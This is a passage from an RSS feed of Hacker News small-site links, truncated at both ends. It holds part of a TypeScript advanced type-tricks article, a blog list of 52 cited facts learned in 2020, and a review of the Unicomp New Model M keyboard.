<p>It is not easy to test for <code>never</code>. Once one of the types in your expression is <code>never</code> it will <strong>poison</strong> the rest of the expression to evaluate to <code>never</code>. Typically, this is a useful feature, but when you actually need to check for <code>never</code> you can wrap your expression in a tuple. This will trick the TypeScript compiler to compare apples to apples instead of expanding the <code>never</code>.</p>
<p>It works by comparing the tuple <code>T</code> to the tuple <code>never</code>. We use this tuple trick in a number of places. I am not certain as to why it works, other than the fact that tuples make TypeScript slightly less greedy in its evaluation.</p>
<hr>
<p>
  <img src="https://casualdeveloper.net/img/never.gif" alt="What never? No never.">

</p>
<h2 id="compare-multiple-types-at-once">Compare Multiple Types At Once</h2>
<h3 id="example-2">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> Shoes&lt;<span>T1</span>, <span>T2</span>, <span>T3</span>&gt; <span>=</span> T1 <span>extends</span> {} <span>?</span> 
                              (T2 <span>extends</span> <span>number</span> <span>?</span> 
                                  (T3 <span>extends</span> <span>string</span> <span>?</span> 
                                      1 : 
                                      <span>0</span>)<span>:</span> 
                                  <span>0</span>)<span>:</span> 
                              <span>0</span>;
</code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span><span>type</span> Shoes&lt;<span>T1</span>, <span>T2</span>, <span>T3</span>&gt; <span>=</span> 
                        [
                            T1 <span>extends</span> {} <span>?</span> 1 : <span>0</span>, 
                            T2 <span>extends</span> <span>number</span> <span>?</span> 1 : <span>0</span>, 
                            T3 <span>extends</span> Something <span>?</span> 1 : <span>0</span>
                        ] <span>extends</span> 
                        [<span>1</span>, <span>1</span>, <span>1</span>] <span>?</span> 
                        1:
                        <span>0</span>;
</code></pre></div>
<h3 id="reason-2">Reason</h3>
<p>You will often need to deeply check a few things, and only execute some logic if all are a certain value. This can result in an annoying deeply nested structure.</p>
<p>One clean solution to this is to check all of them upfront in a tuple and compare that to the expected results of each. Now your tree is only one level deep and your intent is much clearer!</p>
<hr>
<h2 id="dont-distribute-my-union">Don’t Distribute My Union</h2>
<h3 id="example-3">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> StringToObject&lt;<span>T</span>&gt; <span>=</span> T <span>extends</span> <span>string</span> <span>?</span> {[key <span>in</span> T]<span>:</span> <span>boolean</span>} <span>:</span> <span>never</span>;

<span>type</span> UnionToObject&lt;<span>T</span>&gt; <span>=</span> StringToObject&lt;<span>T</span>&gt;;
<span>type</span> Nested&lt;<span>T</span>&gt; <span>=</span> {[key <span>in</span> <span>keyof</span> T]<span>:</span> UnionToObject&lt;<span>T</span>[<span>key</span>]&gt;};

<span>const</span> value: <span>Nested</span><span>&lt;</span>{thing<span>:</span> <span>'a'</span> <span>|</span> <span>'b'</span> <span>|</span> <span>'c'</span>}<span>&gt;</span> <span>=</span> {thing<span>:</span> {a: <span>true</span>, c: <span>true</span>}}; <span>// NO ERROR
</span></code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span><span>type</span> StringToObject&lt;<span>T</span>&gt; <span>=</span> [T] <span>extends</span> [<span>string</span>] <span>?</span> {[key <span>in</span> T]<span>:</span> <span>boolean</span>} <span>:</span> <span>never</span>;
<span>//                       ^ ^         ^      ^
</span><span></span><span>type</span> UnionToObject&lt;<span>T</span>&gt; <span>=</span> StringToObject&lt;<span>T</span>&gt;;
<span>type</span> Nested&lt;<span>T</span>&gt; <span>=</span> {[key <span>in</span> <span>keyof</span> T]<span>:</span> UnionToObject&lt;<span>T</span>[<span>key</span>]&gt;};

<span>const</span> value: <span>Nested</span><span>&lt;</span>{thing<span>:</span> <span>'a'</span> <span>|</span> <span>'b'</span> <span>|</span> <span>'c'</span>}<span>&gt;</span> <span>=</span> {thing<span>:</span> {a: <span>true</span>, c: <span>true</span>}}; <span>// ERROR Missing 'b'
</span></code></pre></div>
<h3 id="reason-3">Reason</h3>
<p>Sometimes you will pass a union so deeply that when it reaches its final destination the union has been distributed. This <em>can</em> result in unintended behavior as described above. Since the union has been distributed, <code>value</code> in the first example will result in the type</p>
<pre><code>{thing:
    {[key in 'a']:boolean} | 
    {[key in 'b']:boolean} | 
    {[key in 'c']:boolean}
}
</code></pre><p>when your goal was simply <code>{thing: {[key in ('a'|'b'|'c')]:boolean} }</code>.</p>
<p>The solution to this is to wrap <code>T</code> in a tuple to force TypeScript to not distribute your union in subsequent expressions.</p>
<hr>
<h2 id="exclude-never">Exclude <code>never</code></h2>
<h3 id="example-4">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> Bad <span>=</span> {shoes:<span>never</span>; other: <span>boolean</span>}
<span>const</span> value: <span>Bad</span> <span>=</span> {shoes:<span>1</span>, other:<span>true</span>};  <span>// throws an error on shoes but intellisense and type is misleading
</span></code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span>
<span>export</span> <span>type</span> ExcludeNever&lt;<span>T</span>&gt; <span>=</span> {
    [key <span>in</span> <span>keyof</span> T <span>as</span> T[key] <span>extends</span> <span>never</span> <span>?</span> <span>never</span> <span>:</span> key]<span>:</span> T[key];
};


<span>const</span> value: <span>ExcludeNever</span>&lt;<span>Bad</span>&gt; <span>=</span> {shoes: <span>1</span>, other: <span>true</span>} <span>// throws a full error and no intellisense
</span></code></pre></div>
<h3 id="reason-4">Reason</h3>
<p>Occasionally you will process some type in a <code>Record</code> and set a value to never. This is perfectly valid and will throw errors when the user attempts to put a value there.</p>
<p>The problem is, intellisense does not exclude this key from your result list. Sure the type is <code>never</code>, but since the key still exists it will allow you to put a value there.</p>
<p>The solution is to use the new TypeScript <code>as</code> syntax to set the key to <code>never</code> when appropriate, that way it will not be available to the user.</p>
<p>Note: the end result is the same, you cannot put a value for shoes, but the DX is significantly improved in the second case.</p>
<hr>
<h2 id="potential-solution-to-type-instantiation-is-excessively-deep-and-possibly-infinite">Potential Solution To <code>type instantiation is excessively deep and possibly infinite</code></h2>
<h3 id="example-5">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> GoDeep&lt;<span>T</span>&gt; <span>=</span> <span>/*...*/</span> GoDeep&lt;<span>T</span>&gt;; 
</code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span><span>type</span> GoDeep&lt;<span>T</span>&gt; <span>=</span> T <span>extends</span> <span>infer</span> R <span>?</span> <span>/*...*/</span> GoDeep&lt;<span>R</span>&gt; <span>:</span> Impossible;
</code></pre></div>
<h3 id="reason-5">Reason</h3>
<p>Now this one is a bit hard to explain, but easily one of the most powerful tricks in this post. It has saved my bacon too many times to count.</p>
<p>The example above is intentionally sparse since it’s hard to find real world examples. <em>When you need it, you’ll know</em>.</p>
<p>Along your journey to making a complex library completely typesafe you will inevitably create a type that is <em>potentially</em> infinitely deeply nested.</p>
<p>A little background: TypeScript has a rule that it will generally not dive deeper than about 50 levels of type checking before it throws up its hands and resolves the dreaded “type instantiation is excessively deep and possibly infinite”. This means your type is too complex and it would take too long to evaluate, so it wont.</p>
<p>I will say that 90% of the time this is due to an issue in your code that is solvable without use of trickery. Typically, you screwed up somewhere. However, on the rare occasion where you did everything right, your type is properly optimized, but your library requirements actually do push the envelope, you can use the above trick.</p>
<p>How it works is still a bit of a mystery to me. This is a trick I learned from the incredible library <a href="https://github.com/millsp/ts-toolbelt">ts-toolbelt</a>. The best I can tell is it <strong>defers</strong> the evaluation of the type T until it is actually requested. What this means is just because your type <strong>can</strong> be nested infinitely, this outcome will be tested <strong>based on usage</strong> rather than a blanket statement.</p>
<p>That means if you pass a T that does exhaust the 50 cap then TypeScript will be sure to let you know, but until then all of the T’s that play nice will continue to work.</p>
<p>I dont know if the explanation above is correct and would love to be corrected! In my experience and research this is how it works.</p>
<p>
  <img src="https://casualdeveloper.net/img/deep.gif" alt="Deep">

</p>
<hr>
<h2 id="potential-solution-to-excessive-union">Potential Solution To <code>excessive union</code></h2>
<h3 id="example-6">Example</h3>
<div><pre><code data-lang="typescript"><span>type</span> Depths <span>=</span> <span>1</span> <span>|</span> <span>2</span> <span>|</span> <span>3</span> <span>|</span> <span>4</span> <span>|</span> <span>5</span>;

<span>type</span> NextDepth&lt;<span>TDepth</span> <span>extends</span> <span>Depths</span>&gt; <span>=</span> TDepth <span>extends</span> <span>1</span>
  <span>?</span> 2
  : <span>TDepth</span> <span>extends</span> <span>2</span>
  <span>?</span> 3
  : <span>TDepth</span> <span>extends</span> <span>3</span>
  <span>?</span> 4
  : <span>TDepth</span> <span>extends</span> <span>4</span>
  <span>?</span> 5
  : <span>never</span>;

<span>export</span> <span>type</span> SafeTypes <span>=</span> <span>number</span> <span>|</span> <span>string</span> <span>|</span> <span>boolean</span> <span>|</span> <span>Date</span>

<span>export</span> <span>type</span> DeepKeys&lt;<span>T</span> <span>extends</span> {}, <span>TDepth</span> <span>extends</span> <span>Depths </span><span>=</span> <span>1</span>&gt; <span>=</span> TDepth <span>extends</span> <span>5</span>
  <span>?</span> <span>//                                                           ^^ here is the check …</span></code></pre></div></div></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://casualdeveloper.net/post/2020-12-21-advanced-typescript-type-tricks/">https://casualdeveloper.net/post/2020-12-21-advanced-typescript-type-tricks/</a></em></p>]]>
            </description>
            <link>https://casualdeveloper.net/post/2020-12-21-advanced-typescript-type-tricks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25501761</guid>
            <pubDate>Tue, 22 Dec 2020 01:11:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[52 Things I Learned in 2020]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25501631">thread link</a>) | @kashd
<br/>
December 21, 2020 | https://www.kashdhanda.com/post/52-things-i-learned-in-2020 | <a href="https://web.archive.org/web/*/https://www.kashdhanda.com/post/52-things-i-learned-in-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Inspired by the great <a href="https://medium.com/@tomwhitwell">Tom Whitwell</a>, I've assembled a list of 52 Things I've Learned in 2020. My hope is that you'll find useful insights, but my guarantee is that you'll find a few fun pieces of trivia to discuss at (socially distanced) parties.</p><p>The learnings are roughly grouped according to my interests, including Public Policy, Creativity and Design, History, The Future, Technology, Global Affairs, Health, Money, and US Politics.</p><ol role="list"><li><strong>Needle Exchange Programs are Ridiculously Cost-Effective</strong>: &nbsp;A $1 government investment in needle exchange programs produces $6 in government savings, almost entirely by reducing the transmission rate of HIV. (<a href="https://kyhrc.org/2020/04/01/needle-exchange-programs-save-money-and-lives/">source</a>)</li><li><strong>Blue Lights Prevent Suicide</strong>: 20 years ago, the Japanese installed blue LED panels on platforms to prevent suicide. A 10 year study found an 84% decline in suicide attempts at stations where lights were installed, with no decline at stations without lights. (<a href="https://pubmed.ncbi.nlm.nih.gov/22980401/">source</a>)</li><li><strong>A Basic Income is Better than a Jobs Guarantee</strong>: Only about 15% of the jobless are your traditional unemployed people looking for a new job. 60% are disabled. Disability has doubled over the past twenty years and continues to increase. A Jobs Guarantee won't actually help most people who are unemployed. (<a href="https://slatestarcodex.com/2018/05/16/basic-income-not-basic-jobs-against-hijacking-utopia/">Scott Alexander</a>)</li><li><strong>Cement produces more air pollution than all the trucks in the world combined:</strong> Manufacturing the stone-like building material is responsible for 7% of global carbon dioxide emissions, more than what comes from all the trucks in the world. (<a href="https://www.bloombergquint.com/business/green-cement-struggles-to-expand-market-as-pollution-focus-grows">source</a>)</li><li><strong>Justice Takes a Backseat to Emotion</strong>: After the LSU football team loses a game, juvenile court judges in Louisiana hand out sentences that are 6.4% longer on average. Sentence length correlates with how far a judge lives from LSU, with the longest sentence lengths handed out by judges who live closest to LSU. (<a href="https://www.nber.org/papers/w22611#:~:text=Employing%20the%20universe%20of%20juvenile,college%20team%20in%20the%20state.)">source</a></li><li><strong>1/3 of White Harvard Students Haven't Earned Their Spot Through Academic Merit:</strong> A staggering 43% of white Harvard students are legacies, athletes, or children of donors. Of those, around 75% would have been rejected if not for their special preference. (<a href="https://www.nbcnews.com/news/us-news/study-harvard-finds-43-percent-white-students-are-legacy-athletes-n1060361">source</a>)</li><li><strong>Being Good Looking is a Privilege, Part 476</strong>: In one study, unattractive criminals were fined 3 times more than attractive criminals for moderate misdemeanours. However, appearance doesn’t seem to influence verdicts of guilt or innocence (<a href="https://medium.com/fluxx-studio-notes/52-things-i-learned-in-2020-6a380692dbb8">Tom Whitwell</a>).</li></ol><ol role="list"><li><strong>People are Endlessly Creative (or Terrible Spellers)</strong>: ~15% of daily searches on Google have never been searched for before. (<a href="https://www.digitalinformationworld.com/2020/08/google-is-still-not-the-all-knowing-almighty-search-engine-as-15-percent-of-queries-are-never-seen-before-by-tech-giant.html">source</a>)</li><li><strong>Small Design Changes Make a Big Difference</strong>: One Dutch bike manufacturer reduced shipping damage by 70-80% simply by printing the image of a big flatscreen TV on their boxes. (<a href="https://www.theverge.com/2016/9/25/13048668/vanmoof-shipping-damages-dutch-bicycle-design">source</a>)</li><li><strong>The Best Way to Give Writing Feedback</strong>: Use the acryonm CRIBS. Note anything that is Confusing, Repetitive, Interesting, Boring, or Surprising. (<a href="https://www.perell.com/tweetstorms/cribs-my-writing-feedback-formula">David Perell</a>)</li><li><strong>Silly Mistakes Happen to the Best of Us</strong>: In 1999, the $125m Mars Climate Orbiter was lost because one team was using inches, the other was using centimeters. (<a href="https://www.latimes.com/archives/la-xpm-1999-oct-01-mn-17288-story.html">source</a>)</li><li><strong>Sequencing Matters</strong>: The first item in a buffet is taken by 75% of diners, even when the food order was reversed. 66% of all food taken comes from the first 3 items, no matter how long the buffet is. (<a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0077055">David Perell</a>)</li><li><strong>Betteridge's Law of Headlines:</strong> Any headline that ends with a question mark can be answered by the word "No". (<a href="https://en.wikipedia.org/wiki/Betteridge%27s_law_of_headlines">Wikipedia</a>)</li></ol><ol role="list"><li><strong>"Carrots are Good for Your Eyes" was an Anti-Nazi Scheme:</strong> The myth that carrots are beneficial for eyesight started as a military disinformation campaign in WWII by the Brits. They didn't want the Germans to realize that the RAF were shooting down so many enemy planes because they had radar, so they made up a lie about carrots that got stuck in the popular consciousness. (<a href="https://www.smithsonianmag.com/arts-culture/a-wwii-propaganda-campaign-popularized-the-myth-that-carrots-help-you-see-in-the-dark-28812484/">Smithsonian</a>)</li><li><strong>The Craziest Piece of History No One Told Me About:</strong> In 1800s China, a man claiming to be the brother of Jesus started a church. By the end of the story, 20 million people died in perhaps the bloodiest civil war in history. Fact is crazier than fiction. (<a href="https://en.wikipedia.org/wiki/Taiping_Rebellion">Wikipedia</a>)</li><li><strong>When You Don't Have a Lot, Make Use of What You Have</strong>: The Romans used to use stale urine as mouthwash. Due to the ammonia in the urine, it actually worked pretty well! (<a href="https://www.smithsonianmag.com/science-nature/from-gunpowder-to-teeth-whitener-the-science-behind-historic-uses-of-urine-442390/">Smithsonian</a>)</li><li><strong>America Did Not Start as a Democracy</strong>: Only 6% of the population was eligible to vote when George Washington ran for president. (<a href="https://en.wikipedia.org/wiki/1788%E2%80%9389_United_States_presidential_election">Wikipedia</a>)</li><li><strong>The Black Plague May Have Driven the Rise of the West</strong>: The Black Death kills over 40% of Europe's population. Some historians think that the resulting labor scarcity increased the bargaining power of peasants in the West, which led to the end of serfdom and to higher standards of living. Since the Plague was not as deadly in the East, the equivalent institutional changes never took place. [<a href="https://sloanreview.mit.edu/article/the-great-innovation-deceleration">MIT Sloan</a>]</li></ol><ol role="list"><li><strong>Internet History is Evaporating, and the Future is the Victim</strong>: 70% of links within the Harvard Law Review and 50% of URLs within United States Supreme Court opinions do not link to the originally cited information. (<a href="https://harvardlawreview.org/2014/03/perma-scoping-and-addressing-the-problem-of-link-and-reference-rot-in-legal-citations/">Harvard Law Review</a>)</li><li><strong>Deaths of Despair are Rapidly Rising:</strong> Between 1999 and 2017, midlife mortality from drug overdoses increased by nearly 400% (from 6.7 deaths/100,000 to 32.5), alcoholic liver disease increased by 40.6% (from 6.4 to 8.9), and suicide rates increased by 38.3% (from 13.4 to 18.6). (<a href="https://peterattiamd.com/why-is-life-expectancy-in-the-us-declining/">Dr. Peter Attia</a>)</li><li><strong>Clarke's First Law:</strong> When a distinguished but elderly scientist states that something is possible, he is almost certainly right. When he states that something is impossible, he is very probably wrong. (<a href="https://www.lesswrong.com/posts/irbREZtZzPi7WEYex/book-review-human-compatible-1">Scott Alexander</a>)</li><li><strong>Virtual Goods Will be a Trillion Dollar Business Someday</strong>: According to SuperData, virtual marketplaces generated $109 billion in 2019, 85% of which came from the purchase of virtual goods. (<a href="https://www.morningbrew.com/emerging-tech/stories/2020/05/25/todays-largest-games-thriving-virtual-economies?__cf_chl_jschl_tk__=8d4b1676a414c884b7e4d2f8e7f8cc1996fcdd3d-1607583077-0-AaDJV_rUtoKtK77M9bqejnODyJ4Uf98-V_BEjDsytGralRbifDBsYzco65WZVcACLBHKWOm4oEifs-vqH4Xs74o8QFgPphBDGmdv_h92Af-0fptwf5iHxEL2PLR9GhZnQbElXzz2QqqPU0KOpnixifVR90S04Eljx8WmYNAuBtxqOV5iLPoKWQ13iS6j3oNeYqbOzkPmYdO5LGSUxB_6qhIPpfYWZ7AduWDPApMGQvaHZtmJ90_lUXyhgMgZqxL4ciMEpYpT1LAzlBDFTjRKHNoXGmFIV0668Z4oFSUqtzDWDzL4cQJi0c9ADYJnYRzWy_AlJ2njxoCLzp3Bnz1--YA_cjZx_oKUGtg7GmE-8W9_nKri_VMd_-vVGQKqFBkBKLucIwa6po02QC1ZoWiZf1Tcv9tNz4iqgES_PEyCRRoNC7q3MYXapO2NCrgwEyeGIIg1_EQ_ofv0FJV49n03m1w1-os5EH7crBhx9ZcFZJ4r">Morning Brew</a>)</li><li><strong>The Age of the American Internet is Over</strong>: 80-90% of internet users are now outside the USA, there are more smartphone users in China than in the USA and western Europe combined, and the creation of venture-based startups has gone global. American policy preferences will no longer govern how the internet develops. (<a href="https://www.ben-evans.com/benedictevans/2020/10/3/the-end-of-the-american-internet">Benedict Evans</a>)</li></ol><ol role="list"><li><strong>Amazon Prime is Essential to the Fabric of America</strong>: 82% of American homes have Amazon Prime, more than voted in the 2016 election, have a pet, attend church, or decorate a Christmas tree. (<a href="https://twitter.com/profgalloway/status/1288546564374437894?lang=en">Scott Galloway</a>)</li><li><strong>The Big 3 Are The Main Beneficiaries Of The Venture Boom:</strong> Startups spend almost 40 cents of every VC dollar on Google, Facebook, and Amazon. (<a href="https://mobiledevmemo.com/facebook-google-alternative-start-up-user-acquisition/">Chamath Palihapitiya</a>)</li><li><strong>Software Matters More than Hardware:</strong> With today’s algorithms, computers would have beat the world chess champion already in 1994 (instead of 1997) on a contemporary desk computer. (<a href="https://www.lesswrong.com/posts/75dnjiD8kv2khe9eQ/measuring-hardware-overhang">hippke</a>)</li><li><strong>Public Markets Lead to Short-Termism</strong>: Less than a third of S&amp;P companies actually have R&amp;D budgets. This is largely due to the fact that R&amp;D can take years to produce meaningful revenue benefits.</li><li><strong>There's a Tsunami of Data Created Every Hour</strong>: More data is created every hour in 2020 than was created in all of the year 2000. (<a href="https://www.seagate.com/files/www-content/our-story/rethink-data/files/Rethink_Data_Report_2020.pdf">Seagate</a>)</li></ol><ol role="list"><li><strong>Hindu Nationalism Runs Deeper in India than I Knew:</strong> The RSS, a Hindu nationalist paramilitary organization, runs 30,000 schools, the largest network of farmers and social-welfare organization in the slums, the 2nd largest network of trade unions, and spawned the BJP, India's most powerful political party. (<a href="https://en.wikipedia.org/wiki/Rashtriya_Swayamsevak_Sangh#:~:text=RSS%20was%20founded%20on%2027,Hindu%20Rashtra%20(Hindu%20nation).)">Wikipedia</a></li><li><strong>The Caste System is Alive and Well in Indian Marriages</strong>: Only about 5% of marriages in India are between members of two different castes. (<a href="https://en.wikipedia.org/wiki/Inter-caste_marriages_in_India">Wikipedia</a>)</li><li><strong>Non-Chinese People Don't Want to Live in China:</strong> Sydney, Australia alone has more foreign-born residents than mainland China. (<a href="https://marginalrevolution.com/marginalrevolution/2019/12/china-facts-of-the-day-7.html">Tyler Cowen</a>)</li><li><strong>The UK Conservative Party (a.k.a the Tories) Have a Realllllly Old Support Base</strong>: In 2018, the party received twice as much money from dead members, through wills, as from the living. (<a href="https://www.bbc.co.uk/news/uk-politics-45271284">BBC</a>)</li><li><strong>Shutting Down Nuclear Power is a Really Bad Idea</strong>: After Fukushima, Germany shut down 50% of its nuclear power plants. This study estimates that this decision cost Germany $12 billiondollars, mostly from the cost of 1,100 excess deaths since then attributable to local air pollution from coal plants. (<a href="https://marginalrevolution.com/marginalrevolution/2020/01/nuclear-energy-saves-lives.html">Alex Tabarrok</a>)</li></ol><ol role="list"><li><strong>Don't Get Surgery on the Weekends:</strong> You are 44% more likely to die if you have surgery on a Friday (1.44%) compared to a Monday (1%). That jumps to 82% is you have surgery on a weekend. (<a href="https://danariely.com/2013/08/11/monday-is-good-for-something-after-all-surgery/">Dan Ariely</a>)</li><li><strong>Depression Dulls Your Senses:</strong> Depressed people have worse sense of smell, and people with worse sense of smell are more likely to get depressed. We already know that depression decreases visual contrast, causing the world to literally look washed-out and gray. (<a href="https://slatestarcodex.com/2020/04/17/depression-the-olfactory-perspective/">Scott Alexander</a>)</li><li><strong>America is Obese Partially Because Everyone is Eating Fast Food</strong>: Every day, about 84 million adults in America eat fast food. (<a href="https://www.cdc.gov/nchs/products/databriefs/db322.htm">Centers for Disease Control</a>)</li><li><strong>Zinc Dramatically Helps with Colds, If You Take a Lot Quickly:</strong> Most studies suggest that it'll shorten the cold by 12-48%. Nasal discharge goes down by 34%, congestion by 37%, and muscle ache by 54%. But you need to take a high dose, roughly 80 mg/day, started within 24 hours of the first symptoms. (<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3273967/#:~:text=A%20meta%2Danalysis%20published%20in,were%20present%20after%207%20days.&amp;text=A%20meta%2Danalysis%20published%20in%20June%202011%20concluded%20that%20zinc,at%20daily%20doses%20%3E75%20mg.)">Source</a></li><li><strong>The Amish are Remarkably Healthy</strong>: The Amish outperform the English on every measured health outcome. 65% of Amish rate their health as excellent or very good, compared to 58% of English. Diabetes rates are 2% vs. 8%, heart attack rates are 1% vs. 6%, high blood pressure is 11% vs. 31%. (<a href="https://slatestarcodex.com/2020/04/20/the-amish-health-care-system/">Scott Alexander</a>)</li><li><strong>Calorie Counts are Mostly Lies</strong>: Labels on American packaged foods miss their true calorie counts by an average of 18%. The information on processed frozen foods misstates their calorific content by as much as 70%. (<a href="https://www.economist.com/1843/2019/02/28/death-of-the-calorie">The Economist</a>)</li><li><strong>American Offices are Tougher than I Thought:</strong> 48% of employees in the US alone have cried at work. (<a href="https://go.ginger.io/annual-behavioral-health-report-2019">Ginger</a>)</li></ol><ol role="list"><li><strong>Wealth Fades, Quickly</strong>: 70% of wealthy families lose their wealth by the 2nd generation, and 90% by the 3rd. (<a href="https://twitter.com/marshal/status/1281758727918542848">h/t Marshall Haas</a>)</li><li><strong>People are Less Rational than You Think:</strong> People spend more on lottery tickets than movies, video games, music, sporting events, and books combined. (<a href="https://twitter.com/david_perell/status/1285364113741209600?lang=en">David Perell</a>)</li><li><strong>The US is Rich. Really Rich</strong>: If the United Kingdom was a US state, it would be the third poorest by GDP/capita, only Arkansas and Mississippi are lower. (<a href="https://en.wikipedia.org/wiki/List_of_U.S._states_and_territories_by_GDP_per_capita">Wikipedia</a>)</li><li><strong>Tesla is Big. Really Big</strong>: On July 14th, …</li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.kashdhanda.com/post/52-things-i-learned-in-2020">https://www.kashdhanda.com/post/52-things-i-learned-in-2020</a></em></p>]]>
            </description>
            <link>https://www.kashdhanda.com/post/52-things-i-learned-in-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-25501631</guid>
            <pubDate>Tue, 22 Dec 2020 00:49:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unicomp New Model M Keyboard]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25501600">thread link</a>) | @todsacerdoti
<br/>
December 21, 2020 | https://www.softinio.com/post/unicomp-new-model-m-keyboard/ | <a href="https://web.archive.org/web/*/https://www.softinio.com/post/unicomp-new-model-m-keyboard/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><article><img src="https://www.softinio.com/img/unicomp_new_model_m.png"><p>Unicomp new Model M keyboard is the latest version of the classic and fabulous IBM Model M keyboard that came out earlier this year. This blog post is my unboxing and review of this timeless keyboard.</p><p>My favorite keyboard of all time was the <a href="https://en.wikipedia.org/wiki/Model_M_keyboard">IBM Model M keyboard</a>. Through out the 1980s and the 1990s I would exclusively use this keyboard. In fact as I type this blog post I can confirm I still have 3 of them in my garage back in London, England.</p><p>Ever since I moved to the USA, both at work and at home I have been using various keyboards by Apple. Though I have nothing bad to say about the Apple keyboards, after all they are cosmetically pleasing, of high build quality and work really well with all things Apple, I started really missing my IBM Model M. This is when I found out Unicomp have released a new Model M and I decided to buy one.</p><h2 id="who-are-unicomp">Who are Unicomp?</h2><p>When IBM decided to stop manufacturing keyboards, a company called Lexmark bought their equipment and all rights to their keyboards and continued making them. In turn Lexmark stopped manufacturing keyboards too and at that point some ex-IBM and ex-Lexmark staff got together, purchased all the manufacturing equipment and rights to continue manufacturing the keyboards (but of course without the IBM and Lexmark branding) and setup a new company called <code>Unicomp</code>. <a href="https://www.pckeyboard.com/">Unicomp</a> has since continued producing these keyboards for like the last 25 years.</p><h2 id="unboxing">Unboxing</h2><p>This is how it was delivered:</p><p><img src="https://www.softinio.com/img/unicomp_model_m_box.png" alt="Unicomp New Model M box"></p><p>When the package arrived I could feel the keyboard moving inside the box, but when I opened the box I saw how well it was packed:</p><p><img src="https://www.softinio.com/img/unicomp_model_m_open_box.png" alt="Unicomp New Model M opened box"></p><p>I took it out of its box and removed all packaging material it was wrapped in:</p><p><img src="https://www.softinio.com/img/unicomp_model_m_out_of_box.png" alt="Unicomp New Model M Keyboard"></p><h2 id="review">Review</h2><p>As I looked at the keyboard, before taking it out of the box, I could immediately tell it was a Model M and its evolution. Super excited and impatient I took it out of the box. My first observation was that it comes with a USB (standard not USB-C) cable that is not removable. It felt lighter in weight than the original IBM Model M I had. Next I looked at its build quality and was overall impressed. The original IBM Model M does feel more robust but I could not fault this new Model M. All this was to be expected though, as I didn’t have my expectation set to receiving a keyboard that is made by 100% the same materials as the original Model M I had.</p><p>Having one of the newer macbooks with only USB-C ports, I set my new keyboard on my desk and plugged it in via a USB adapter and off I went looking for excuses to type so I can use my new keyboard.</p><p>I am thoroughly enjoying using this keyboard. Its typing feel and size are on par with the original Model M I had. I had forgotten how much more comfortable it is to type on Model M than an Apple keyboard. Comparing now, I can see that my hands are too big for the Apple keyboards so I would try to type in a cramped space to fit my hands in, as opposed to this Model M which is perfect for my hand size. This alone has resulted in me being able type faster, be more comfortable and make virtually no typing mistakes. As always I find the higher actuation point feel and the audible feedback the sound provided by the buckling springs with each keystroke incredibly pleasing. Comparing the sound of the buckling springs with the original IBM Model M, I would say the new Unicomp Model M is slightly quieter.</p><h3 id="how-well-does-it-work-with-macos">How well does it work with macOS</h3><p>When I went to place my order on Unicomp website they only had a windows version of the new Model M listed. Whilst that will work fine with macOS, it does have some features missing compared to a keyboard that has dedicated support for macOS, such as volume control, music play/stop/previous track /next track keys. Good news is I called Unicomp and spoke to Troy about this and he was kind enought to tell me I can place an order and request a custom configuration at a small fee to have the extra macOS features added. I did that and my keyboard has all the extra macOS keys functioning as expected. It even has the window key replaced with the macOS command key.</p><p><img src="https://www.softinio.com/img/unicomp_model_m_mac_keys.png" alt="Unicomp New Model M with macOS layout"></p><h3 id="unicomp-quality-of-service">Unicomp quality of service</h3><p>When you first visit Unicomp website, you get the sense that you just visited a website from 20 years ago with not the best user experience browsing or ordering. When you research Unicomp on the internet you won’t find much activity on social media or any form of marketing.</p><p>Please do not be put off by this and don’t judge them because of their dated look. The quality of service I received is one of the best I have ever received. When I called to find out more about the New Model M not only was the help I received exemplarity, but once I placed my order, even though it had the custom configuration of macOS support added was shipped within 24 hours of placing the order and the item received is fantastic in every possible way.</p><h2 id="conclusion">Conclusion</h2><p>I am back again reunited with my old friend a Model M. I am enjoying using it so much after a gap of not having one that I am looking for excuses to use it more and more. So expect more <a href="https://www.softinio.com/">blogs</a> and <a href="https://softinio.substack.com/">newsletters</a> from me going forward, as this keyboard is a joy to use.</p><h2 id="references">References</h2><ul><li><a href="https://www.pckeyboard.com/page/product/NEW_M">Link to Unicomp Model M that I ordered</a></li></ul></article></div></div></div>]]>
            </description>
            <link>https://www.softinio.com/post/unicomp-new-model-m-keyboard/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25501600</guid>
            <pubDate>Tue, 22 Dec 2020 00:44:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The One Hundred Best Albums of 2020]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25501586">thread link</a>) | @jger15
<br/>
December 21, 2020 | http://tedgioia.com/bestalbumsof2020.html | <a href="https://web.archive.org/web/*/http://tedgioia.com/bestalbumsof2020.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://tedgioia.com/bestalbumsof2020.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25501586</guid>
            <pubDate>Tue, 22 Dec 2020 00:41:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nitro Enclaves reduce the attack surface on EC2]]>
            </title>
            <description>
<![CDATA[
